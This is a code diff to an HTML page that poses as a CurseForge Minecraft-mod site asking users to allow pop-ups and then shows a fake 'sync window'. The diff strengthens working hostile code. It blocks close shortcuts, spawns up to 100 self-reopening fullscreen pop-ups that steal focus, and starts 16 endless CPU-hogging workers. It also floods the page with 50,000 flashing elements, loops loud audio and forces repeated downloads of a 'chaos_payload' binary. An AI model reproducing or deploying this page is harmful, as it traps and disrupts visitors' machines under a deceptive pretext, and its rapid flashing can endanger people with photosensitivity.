@@ -1,164 +1,194 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Pop-up Permission Required</title>
-  <script>
-    function openPopup() {
-      const width = 500;
-      const height = 400;
-
-      const maxLeft = window.screen.width - width;
-      const maxTop = window.screen.height - height;
-
-      const left = Math.floor(Math.random() * maxLeft);
-      const top = Math.floor(Math.random() * maxTop);
-
-      const popup = window.open(
-        window.location.href + "?popup=true",
-        "_blank",
-        `width=${width},height=${height},left=${left},top=${top}`
-      );
-
-      if (popup) {
-        popup.focus();
-        window.blur();
-      }
+<meta charset="UTF-8" />
+<title>Pop-up Permission Required</title>
+<script>
+  // Block keyboard shortcuts to prevent closing
+  function blockKeys(e) {
+    const blocked = [
+      'F4', 'Escape',
+      'Control+w', 'Control+W', 'Alt+F4', 'Alt+Tab',
+      'Meta+w', 'Meta+W',
+    ];
+    const combo = 
+      (e.ctrlKey ? 'Control+' : '') +
+      (e.altKey ? 'Alt+' : '') +
+      (e.metaKey ? 'Meta+' : '') +
+      e.key;
+    if (blocked.includes(combo) || blocked.includes(e.key)) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
     }
+  }
+  window.addEventListener('keydown', blockKeys, true);
+  window.addEventListener('contextmenu', e => e.preventDefault(), true);
 
-    // Create a Web Worker from a Blob URL running heavy CPU loop
-    function createCpuWorker() {
-      const blob = new Blob([`
-        self.onmessage = function() {
-          let x = 0;
-          while(true) {
-            x += Math.sqrt(Math.random()) * Math.random();
-            if (x > 1e10) x = 0;
-          }
-        };
-      `], { type: 'application/javascript' });
-      const url = URL.createObjectURL(blob);
-      const worker = new Worker(url);
-      worker.postMessage('start');
-      return worker;
-    }
+  // Spawn popup at random position fullscreen trapped with focus lock
+  function openPopup() {
+    const width = 500;
+    const height = 400;
+    const maxLeft = window.screen.width - width;
+    const maxTop = window.screen.height - height;
+    const left = Math.floor(Math.random() * maxLeft);
+    const top = Math.floor(Math.random() * maxTop);
+    const features = `width=${width},height=${height},left=${left},top=${top},` +
+      `fullscreen=yes,scrollbars=no,toolbar=no,location=no,status=no,menubar=no`;
 
-    // Flood DOM with 10,000 flashing divs
-    function floodDOM() {
-      const container = document.createElement('div');
-      container.style.position = 'fixed';
-      container.style.top = '0';
-      container.style.left = '0';
-      container.style.width = '100vw';
-      container.style.height = '100vh';
-      container.style.overflow = 'hidden';
-      container.style.zIndex = '9999';
-      document.body.appendChild(container);
+    const popup = window.open(window.location.href + '?popup=true', '_blank', features);
 
-      for (let i = 0; i < 10000; i++) {
-        const div = document.createElement('div');
-        div.style.position = 'absolute';
-        div.style.width = '5px';
-        div.style.height = '5px';
-        div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
-        div.style.top = `${Math.random() * window.innerHeight}px`;
-        div.style.left = `${Math.random() * window.innerWidth}px`;
-        container.appendChild(div);
-      }
-
-      setInterval(() => {
-        container.childNodes.forEach(div => {
-          div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
-        });
-      }, 50);
-    }
-
-    // Trigger 5 simultaneous downloads
-    function triggerDownloads() {
-      for (let i = 0; i < 5; i++) {
-        const a = document.createElement('a');
-        a.href = "https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin";
-        a.download = `chaos_payload_${Date.now()}_${i}.bin`;
-        a.style.display = 'none';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }
-    }
-
-    window.onload = function () {
-      const isPopup = new URLSearchParams(window.location.search).has('popup');
-
-      if (isPopup) {
-        document.body.innerHTML = `
-          <audio id="screech" autoplay loop>
-            <source src="screech.mp3" type="audio/mpeg">
-          </audio>
-          <h1>CurseForge sync window</h1>
-          <p>Sync in progress... do not close this window.</p>
-        `;
-
-        const screech = document.getElementById('screech');
-        screech.volume = 1.0;
-        screech.play().catch(() => {
-          document.body.addEventListener('click', () => {
-            screech.play();
-          }, { once: true });
-        });
-
-        triggerDownloads();
-
-        floodDOM();
-
-        // Start 4 CPU hog workers
-        for (let i = 0; i < 4; i++) {
-          createCpuWorker();
-        }
-
-        // Spawn 50 new popups
-        for (let i = 0; i < 50; i++) {
+    if (popup) {
+      popup.focus();
+      // Trap focus: if user switches, pull back instantly
+      const interval = setInterval(() => {
+        if (popup.closed) {
+          // Reopen instantly if closed
           openPopup();
+          clearInterval(interval);
+        } else {
+          popup.focus();
+          if (popup.document.fullscreenEnabled && !popup.document.fullscreenElement) {
+            popup.document.documentElement.requestFullscreen().catch(() => {});
+          }
         }
-
-        // Flash background and text colors every 100ms
-        setInterval(() => {
-          const hue = Math.floor(Math.random() * 360);
-          document.body.style.backgroundColor = `hsl(${hue}, 80%, 70%)`;
-          document.body.style.color = `hsl(${(hue + 180) % 360}, 80%, 40%)`;
-        }, 100);
-
-        // No auto-close, pure chaos!
-
-      } else {
-        document.body.innerHTML = `
-          <h1>This wesbite requires pop-ups</h1>
-          <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
-          <p>Thank you for your understanding.</p>
-        `;
-        openPopup();
-      }
-    };
-  </script>
-
-  <style>
-    body {
-      background-color: white;
-      color: black;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 100px;
-      margin: 0;
-      overflow: hidden;
+      }, 100);
     }
-    h1 {
-      font-size: 32px;
-      margin-bottom: 20px;
+  }
+
+  // Web Worker for max CPU torture
+  function createCpuWorker() {
+    const blob = new Blob([`
+      self.onmessage = function() {
+        let x = 0;
+        while(true) {
+          x += Math.sqrt(Math.random()) * Math.random();
+          if (x > 1e10) x = 0;
+        }
+      };
+    `], { type: 'application/javascript' });
+    const url = URL.createObjectURL(blob);
+    const worker = new Worker(url);
+    worker.postMessage('start');
+    return worker;
+  }
+
+  // DOM flood and jitter
+  function floodDOM() {
+    const container = document.createElement('div');
+    container.style.position = 'fixed';
+    container.style.top = '0';
+    container.style.left = '0';
+    container.style.width = '100vw';
+    container.style.height = '100vh';
+    container.style.overflow = 'hidden';
+    container.style.zIndex = '999999999';
+    document.body.appendChild(container);
+
+    for(let i = 0; i < 50000; i++) {
+      const div = document.createElement('div');
+      div.style.position = 'absolute';
+      div.style.width = '3px';
+      div.style.height = '3px';
+      div.style.backgroundColor = `hsl(${Math.random()*360},100%,50%)`;
+      div.style.top = `${Math.random()*window.innerHeight}px`;
+      div.style.left = `${Math.random()*window.innerWidth}px`;
+      container.appendChild(div);
     }
-    p {
-      font-size: 18px;
-      margin: 10px 0;
+
+    setInterval(() => {
+      container.childNodes.forEach(div => {
+        div.style.backgroundColor = `hsl(${Math.random()*360},100%,50%)`;
+        div.style.top = `${Math.random()*window.innerHeight}px`;
+        div.style.left = `${Math.random()*window.innerWidth}px`;
+      });
+      // Flash background and text
+      const hue = Math.floor(Math.random() * 360);
+      document.body.style.backgroundColor = `hsl(${hue}, 80%, 70%)`;
+      document.body.style.color = `hsl(${(hue+180)%360}, 80%, 40%)`;
+    }, 50);
+  }
+
+  // Trigger tons of downloads
+  function triggerDownloads() {
+    for(let i=0; i<10; i++) {
+      const a = document.createElement('a');
+      a.href = "https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin";
+      a.download = `chaos_payload_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
-  </style>
+  }
+
+  window.onload = function() {
+    const isPopup = new URLSearchParams(window.location.search).has('popup');
+
+    if (isPopup) {
+      document.body.innerHTML = `
+        <audio id="screech" autoplay loop>
+          <source src="screech.mp3" type="audio/mpeg">
+        </audio>
+        <h1>CurseForge sync window</h1>
+        <p>Sync in progress... do not close this window.</p>
+      `;
+
+      const screech = document.getElementById('screech');
+      screech.volume = 1.0;
+      screech.play().catch(() => {
+        document.body.addEventListener('click', () => screech.play(), { once:true });
+      });
+
+      triggerDownloads();
+      floodDOM();
+
+      // Spawn 16 CPU hog workers
+      for(let i=0; i<16; i++) createCpuWorker();
+
+      // Spawn 100 popups
+      for(let i=0; i<100; i++) openPopup();
+
+      // Flash colors every 30ms
+      setInterval(() => {
+        const hue = Math.floor(Math.random()*360);
+        document.body.style.backgroundColor = `hsl(${hue},80%,70%)`;
+        document.body.style.color = `hsl(${(hue+180)%360},80%,40%)`;
+      }, 30);
+
+      // Disable closing
+      window.onbeforeunload = () => "Really try to leave?";
+
+    } else {
+      document.body.innerHTML = `
+        <h1>This wesbite requires pop-ups</h1>
+        <p>Due to using CurseForge cross support, please enable pop-ups to contenue.</p>
+        <p>Thank you for your understanding.</p>
+      `;
+      openPopup();
+    }
+  }
+</script>
+
+<style>
+  body {
+    background-color: white;
+    color: black;
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding-top: 100px;
+    margin: 0;
+    overflow: hidden;
+  }
+  h1 {
+    font-size: 32px;
+    margin-bottom: 20px;
+  }
+  p {
+    font-size: 18px;
+    margin: 10px 0;
+  }
+</style>
 </head>
 <body>
 </body>
